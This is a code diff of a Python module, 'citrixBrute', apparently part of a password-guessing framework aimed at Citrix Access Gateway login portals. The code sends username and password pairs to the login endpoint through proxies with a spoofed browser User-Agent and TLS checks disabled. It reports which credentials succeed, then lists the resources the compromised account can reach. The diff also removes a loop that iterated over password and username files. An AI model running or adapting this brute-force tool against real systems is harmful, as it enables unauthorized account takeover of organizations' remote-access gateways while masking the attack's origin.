@@ -11,13 +11,13 @@ from argparse import ArgumentParser
 class citrixBrute(webModule):
     def __init__(self, config, display, lock):
         super(citrixBrute, self).__init__(config, display, lock)
-        self.fingerprint="Citrix Access Gateway"
+        self.fingerprint="2012 Citrix"
         self.response="Success"
     ignore = ['Settings','Log Off']
     def somethingCool(self, config, c, cookie1, cookies, proxy):
        c.headers.update({'Host': config["HOST"], 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': config["protocol"] + '://' + config["HOST"] + '/Citrix/XenAppCAGProd23/auth/silentDetection.aspx', 'Accept-Language': 'en-US,en;q=0.5'})
-       resp1 = c.get(config["HOST"] +'/Citrix/XenAppCAGProd23/', cookies=cookies, allow_redirects=True, verify=False)#, proxies=proxy)
-       silentDetect = c.get(config["HOST"] + '/Citrix/XenAppCAGProd23/auth/silentDetection.aspx', cookies=cookies, allow_redirects=True, verify=False)#, proxies=proxy)
+       resp1 = c.get(config["HOST"] +'/Citrix/XenAppCAGProd23/', cookies=cookies, allow_redirects=True, verify=False, proxies=proxy)
+       silentDetect = c.get(config["HOST"] + '/Citrix/XenAppCAGProd23/auth/silentDetection.aspx', cookies=cookies, allow_redirects=True, verify=False, proxies=proxy)
        cookie2 = silentDetect.cookies['ASP.NET_SessionId']
        cookies2 = dict()
        cookies2['ASP.NET_SessionId'] = cookie2
@@ -25,9 +25,9 @@ class citrixBrute(webModule):
        cookies2['WIClientInfo'] = "Cookies_On#true~icaScreenResolution#1440x900~clientConnSecure#true"
        cookies2['WINGSession'] = "icaScreenResolution#1440x900~streamingClientDetected#~clientConnSecure#true~remoteClientDetected#Ica-Local%3dAuto~icoStatus#IsNotPassthrough"
        cookies2['WIUser'] = "CTX_ForcedClient#Off~CTX_LaunchMethod#Ica-Local"
-       resp = c.get(config["HOST"] + '/Citrix/ /auth/login.aspx', cookies=cookies2, allow_redirects=False, verify=False)#, proxies=proxy)
-       resp2 = c.get(config["HOST"] + '/Citrix/XenAppCAGProd23/auth/agesso.aspx', cookies=cookies2, allow_redirects=False, verify=False)#, proxies=proxy)
-       resp3 = c.get(config["HOST"] + '/Citrix/XenAppCAGProd23/site/default.aspx?CTX_MessageType=INFORMATION&CTX_MessageKey=WorkspaceControlReconnectPartialTemp', cookies=cookies2, allow_redirects=False, verify=False)#, proxies=proxy)
+       resp = c.get(config["HOST"] + '/Citrix/ /auth/login.aspx', cookies=cookies2, allow_redirects=False, verify=False, proxies=proxy)
+       resp2 = c.get(config["HOST"] + '/Citrix/XenAppCAGProd23/auth/agesso.aspx', cookies=cookies2, allow_redirects=False, verify=False, proxies=proxy)
+       resp3 = c.get(config["HOST"] + '/Citrix/XenAppCAGProd23/site/default.aspx?CTX_MessageType=INFORMATION&CTX_MessageKey=WorkspaceControlReconnectPartialTemp', cookies=cookies2, allow_redirects=False, verify=False, proxies=proxy)
        m = re.search('There are no resources currently available for this user.', resp3.text)
        if m:
            print("[-]      No resources available for user.")
@@ -37,11 +37,10 @@ class citrixBrute(webModule):
            for n in m:
                if n not in self.ignore:
                    print('[+]                 ' + n)
-    def connectTest(self, config, payload):
+    def connectTest(self, config, payload, proxy, submitLoc, submitType):
         with session() as c:
             requests.packages.urllib3.disable_warnings()
-            proxy = random.choice(config["proxies"])
-            cpost = c.post(config["HOST"] + '/cgi/login', data=payload, allow_redirects=True, verify=False)#, proxies=proxy)
+            cpost = c.post(config["HOST"] + '/cgi/login', data=payload, allow_redirects=True, verify=False, proxies=proxy)
             #print cpost.text
             if "set-cookie': 'N" in str(cpost.headers):
                 print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
@@ -58,41 +57,3 @@ class citrixBrute(webModule):
                         self.somethingCool(config, c, cookie1, cookies, proxy)
             else:
                 print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
-    def payload(self, config):
-        if config["PASS_FILE"]:
-            pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
-            for pass_line in pass_lines:
-                if config["UserFile"]:
-                    lines = [line.rstrip('\n') for line in open(config["UserFile"])]
-                    for line in lines:
-                        config["USERNAME"] = line.strip('\n')
-                        config["PASSWORD"] = pass_line.strip('\n')
-                        payload = {
-                            'login': config["USERNAME"],
-                            'passwd': config["PASSWORD"]
-                            }
-                        self.connectTest(config, payload)
-                        time.sleep(config["timeout"])
-                else:
-                    config["PASSWORD"] = pass_line.strip('\n')
-                    payload = {
-                        'login': config["USERNAME"],
-                        'passwd': config["PASSWORD"]
-                        }
-                    self.connectTest(config, payload)
-                    time.sleep(config["timeout"])
-        elif config["UserFile"]:
-            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
-            for line in lines:
-                config["USERNAME"] = line.strip('\n')
-                payload = {
-                    'login': config["USERNAME"],
-                    'passwd': config["PASSWORD"]
-                    }
-                self.connectTest(config, payload)
-        else:
-            payload = {
-                'login': config["USERNAME"],
-                'passwd': config["PASSWORD"]
-                }
-            self.connectTest(config, payload)
